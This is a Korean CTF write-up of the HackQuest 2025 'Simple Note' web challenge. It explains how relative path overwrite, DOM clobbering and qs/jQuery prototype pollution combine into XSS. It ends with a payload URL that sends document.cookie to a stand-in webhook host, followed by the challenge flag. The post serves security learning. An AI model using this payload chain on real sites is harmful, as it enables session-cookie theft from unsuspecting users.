---
title: 2025 HackQuest - Simple Note
published: 2025-07-22
description: " "
tags: [CTF, Writeup, hackquest, kaist]
category: CTF
draft: false
---
카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.  
문제가 퀄리티는 상당히 좋았다. Simple Note가 제일 어려웠고 흥미롭게 풀었던 문제라 라이트업을 작성해보겠다.

## Simple Note (Web)

```js
app.get('/track', (req, res) => {
  const id = req.query.id
  const p = posts.get(id)
  if (p && p.author !== req.session.user) p.views++
  res.end(p ? 'views:' + p.views : '')
})

app.get('/view', (req, res) => {
  const id = req.query.id
  const p = posts.get(id)
  if (!p) return res.status(404).send('not found')
  res.send(`<!doctype html><html><head><meta charset="utf-8">
    <script src="./config.js"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qs@6.10.2/dist/qs.js"></script>
    </head><body id="main">
    <div id="content">${DOMPurify.sanitize(p.html)}</div>
    <div id="out"></div>
    </body>
    <script>
    let data = {}
    function merge(target, source) {
      for (const key in source) {
        const value = source[key];
        if (value && typeof value === 'object') {
          if (!target[key]) {
            target[key] = {};
          }
          merge(target[key], value);
        } else {
          target[key] = value;
        }
      }
      return target;
    }

    const params = Qs.parse(location.search.slice(1), { 
        depth: window.options.depth ? window.options.depth : 5,
        allowPrototypes: window.options.allowPrototypes ? true : false,
        parameterLimit: window.options.parameterLimit ? window.options.parameterLimit: 5
     })
    merge(data, params)
    $.get('/track?id=', data)
    </script>
    </html>`)
})

app.get('/config.js', (req, res) => {
  res.send(`
  window.options = {}
  window.options.depth = 20;
  window.options.allowPrototypes = false;
  window.options.parameterLimit = 20;  
  `)
})
```

작성한 노트를 그대로 보여주는 서비스이다.
html injection은 가능한데 DOMPurify에서 `sanitize()` 되기에 바로 플래그를 뽑긴 어렵다.

또한 `config.js` 스크립트를 로드해오고 있으며, 여기엔 `window.options`를 false로 초기화해주는 코드가 담겨있다.

코드를 보면 qs 6.10.2 버전을 쓰고있고 `merge()` 함수가 존재하는데 이걸 보면 prototype pollution을 가지고 뭔가 해야한다는걸 알 수 있다.
그러나 config.js에서 `allowPrototypes`를 false로 설정하고 있기에 바로 pp를 발생시키는것 또한 어렵다.

이는 RPO를 통해 해결할 수 있는데,
```html
<script src="./config.js"></script>
```
상대 경로로 config.js를 로드하고 있기에 `/view/?id=id` 처럼 뒤에 `/`를 붙이면 config.js가 로드되지 않게 방어할 수 있다.
이러면 window.options가 할당되지 않게 되고, DOM Clobbering으로 allowPrototypes를 true로 덮어버릴 수 있다.

```html
<form name="options">
     <input name="allowPrototypes" value="true">
</form>
```

이제 `Prototype pollution`이 가능해졌다.

```js
$.get('/track?id=', data)
```

마지막에 의미없이 `/track`에 요청을 보내 id를 트래킹하고 있는걸 확인할 수 있는데, 이걸 벡터로 사용해 XSS할 수 있다. 
jquery pp to xss에 대한 문서가 깃허브에 존재한다.

[BlackFan - Client-Side-Prototype-Pollution](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md)


최종 페이로드는 이렇다
```
http://158.247.241.230:10897/view/?id=29f97926-66da-4d01-9a80-b69c6b49da52&[constructor][prototype][url]=data:text/javascript;charset=utf-8,document.location.href='https://webhook/test?q='+%2Bdocument.cookie;//&[constructor][prototype][dataType]=script&[constructor][prototype][crossDomain]=
```

`flag: hackquest2025{caf7088a3562e36cb29876b8dd45a3384f4b0d0533ecc2778234b845693eca03}`